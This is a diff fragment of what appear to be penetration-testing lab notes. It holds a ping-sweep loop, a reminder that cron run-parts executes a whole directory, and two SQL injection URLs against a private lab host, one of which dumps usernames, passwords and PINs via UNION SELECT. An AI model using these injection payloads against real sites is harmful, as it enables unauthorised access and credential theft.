@@ -867,10 +867,11 @@ HAM 	32 	$15
 for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
 **NIKTO
 
-Dry Run:
+runparts for cron tab will run everything in that directory 
 
+http://10.50.41.143/uniondemo.php?Selection=2%20or%201=1;
 
-
+http://10.50.41.143/uniondemo.php?Selection=2 UNION SELECT pin,username,passwd FROM session.userinfo
 
 
 
